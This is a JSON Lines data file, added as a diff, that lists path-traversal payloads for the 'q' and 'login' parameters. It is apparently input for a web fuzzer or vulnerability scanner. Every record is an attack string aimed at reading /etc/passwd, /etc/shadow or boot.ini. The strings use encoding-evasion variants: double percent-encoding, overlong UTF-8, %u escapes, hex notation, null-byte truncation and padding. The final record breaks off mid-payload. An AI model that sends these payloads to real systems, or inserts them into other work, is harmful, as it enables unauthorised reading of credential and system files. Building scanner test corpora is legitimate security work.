+{"id": "path-traversal-1aa8d05b-q", "payload": "..\\..\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-1aa8d05b-login", "payload": "..\\..\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-246edd55-q", "payload": "..\\/etc/passwd%00index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-246edd55-login", "payload": "..\\/etc/passwd%00index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-9b9736eb-q", "payload": "..\\/etc/passwd;index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-9b9736eb-login", "payload": "..\\/etc/passwd;index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-888e1684-q", "payload": "..\\\\..\\\\..\\\\..\\\\..\\\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-888e1684-login", "payload": "..\\\\..\\\\..\\\\..\\\\..\\\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-40f93ab2-q", "payload": "..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-40f93ab2-login", "payload": "..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-03feedbb-q", "payload": "..\\\\\\..\\\\\\..\\\\\\..\\\\\\/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-03feedbb-login", "payload": "..\\\\\\..\\\\\\..\\\\\\..\\\\\\/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-efec4f01-q", "payload": "./.././.././.././.././.././.././..//etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-efec4f01-login", "payload": "./.././.././.././.././.././.././..//etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-2d8e58ec-q", "payload": "./.././../boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-2d8e58ec-login", "payload": "./.././../boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-660a2127-q", "payload": "././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../..//etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-660a2127-login", "payload": "././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../..//etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-a6387677-q", "payload": "./\\/././\\/././\\/././\\/././\\/././\\/.//etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-a6387677-login", "payload": "./\\/././\\/././\\/././\\/././\\/././\\/.//etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-f5e943b1-q", "payload": ".\\..\\.\\..\\/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-f5e943b1-login", "payload": ".\\..\\.\\..\\/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-49ba5a53-q", "payload": ".\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-49ba5a53-login", "payload": ".\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-4d27b100-q", "payload": ".\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-4d27b100-login", "payload": ".\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-2e7e7151-q", "payload": ".\\/\\.\\.\\/\\.\\.\\/\\.\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-2e7e7151-login", "payload": ".\\/\\.\\.\\/\\.\\.\\/\\.\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-7de090f7-q", "payload": ".\\\\..\\\\.\\\\..\\\\.\\\\..\\\\/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-7de090f7-login", "payload": ".\\\\..\\\\.\\\\..\\\\.\\\\..\\\\/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-ac200248-q", "payload": "/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-ac200248-login", "payload": "/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-fcb5c99f-q", "payload": "/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-fcb5c99f-login", "payload": "/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-0e531fef-q", "payload": "/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-0e531fef-login", "payload": "/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-4e2939e4-q", "payload": "/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-4e2939e4-login", "payload": "/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-31f4ce27-q", "payload": "/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-31f4ce27-login", "payload": "/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-c297aca7-q", "payload": "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-c297aca7-login", "payload": "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-45ff84a1-q", "payload": "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-45ff84a1-login", "payload": "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-8b3489f3-q", "payload": "/%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-8b3489f3-login", "payload": "/%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-10822ca3-q", "payload": "/%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-10822ca3-login", "payload": "/%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-5e589097-q", "payload": "/%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-5e589097-login", "payload": "/%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-921f3d78-q", "payload": "/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-921f3d78-login", "payload": "/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-d554c68f-q", "payload": "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-d554c68f-login", "payload": "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-b600d361-q", "payload": "/%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-b600d361-login", "payload": "/%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-464a82d3-q", "payload": "/..%252f..%252fboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-464a82d3-login", "payload": "/..%252f..%252fboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-3cdd9309-q", "payload": "/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-3cdd9309-login", "payload": "/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-f98e4c1a-q", "payload": "/..%25c1%259c..%25c1%259cboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-f98e4c1a-login", "payload": "/..%25c1%259c..%25c1%259cboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-bb9e3e34-q", "payload": "/..%5c..%5cboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-bb9e3e34-login", "payload": "/..%5c..%5cboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-69d119c8-q", "payload": "/..%c0%2f..%c0%2f..%c0%2fboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-69d119c8-login", "payload": "/..%c0%2f..%c0%2f..%c0%2fboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-85bad5c4-q", "payload": "/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-85bad5c4-login", "payload": "/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-3fe7f45d-q", "payload": "/..%c0%5c..%c0%5c..%c0%5c..%c0%5cboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-3fe7f45d-login", "payload": "/..%c0%5c..%c0%5c..%c0%5c..%c0%5cboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-63ba4e05-q", "payload": "/..%u2215..%u2215..%u2215..%u2215boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-63ba4e05-login", "payload": "/..%u2215..%u2215..%u2215..%u2215boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-3befd7c6-q", "payload": "/..%uF025..%uF025..%uF025..%uF025..%uF025boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-3befd7c6-login", "payload": "/..%uF025..%uF025..%uF025..%uF025..%uF025boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-e23fc9bc-q", "payload": "/..../..../..../..../..../..../..../..../boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-e23fc9bc-login", "payload": "/..../..../..../..../..../..../..../..../boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-0d78d089-q", "payload": "/....\\....\\....\\....\\....\\....\\....\\....\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-0d78d089-login", "payload": "/....\\....\\....\\....\\....\\....\\....\\....\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-6c992828-q", "payload": "/....\\....\\....\\....\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-6c992828-login", "payload": "/....\\....\\....\\....\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-5ce2fe33-q", "payload": "/..././..././..././..././..././..././..././..././etc/passwd%00", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-5ce2fe33-login", "payload": "/..././..././..././..././..././..././..././..././etc/passwd%00", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-2aa7f02e-q", "payload": "/../..//../..///boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-2aa7f02e-login", "payload": "/../..//../..///boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-3f214d96-q", "payload": "/..\\..\\\\..\\..\\\\..\\..\\\\..\\\\\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-3f214d96-login", "payload": "/..\\..\\\\..\\..\\\\..\\..\\\\..\\\\\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-b42d537c-q", "payload": "/..\\..\\\\..\\..\\\\\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-b42d537c-login", "payload": "/..\\..\\\\..\\..\\\\\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-a3e79262-q", "payload": "/..\\..\\\\..\\..\\\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-a3e79262-login", "payload": "/..\\..\\\\..\\..\\\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-06a62f73-q", "payload": "/..\\/..\\/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-06a62f73-login", "payload": "/..\\/..\\/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-46a3f2d2-q", "payload": "/.//..//.//..//.//..//.//..//boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-46a3f2d2-login", "payload": "/.//..//.//..//.//..//.//..//boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-84095564-q", "payload": "/.//..//.//..//.//..//boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-84095564-login", "payload": "/.//..//.//..//.//..//boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-d0149f94-q", "payload": "/.\\..\\.\\..\\.\\..\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-d0149f94-login", "payload": "/.\\..\\.\\..\\.\\..\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-21e627ea-q", "payload": "/.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\..\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-21e627ea-login", "payload": "/.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\..\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-80bdc10f-q", "payload": "////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-80bdc10f-login", "payload": "////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-c4600888-q", "payload": "/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-c4600888-login", "payload": "/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-c5c6e1f6-q", "payload": "/\\\\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-c5c6e1f6-login", "payload": "/\\\\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-02ce8073-q", "payload": "0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-02ce8073-login", "payload": "0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-5469dc82-q", "payload": "0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-5469dc82-login", "payload": "0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-148b9157-q", "payload": "0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-148b9157-login", "payload": "0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-cb7b9b6f-q", "payload": "0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-cb7b9b6f-login", "payload": "0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-eb5f66f1-q", "payload": "0x2e0x2e\\/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-eb5f66f1-login", "payload": "0x2e0x2e\\/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-9a36aadc-q", "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../..//etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-9a36aadc-login", "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../..//etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-ff7ae830-q", "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../..//etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-ff7ae830-login", "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../..//etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-465592dc-q", "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../..//etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-465592dc-login", "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA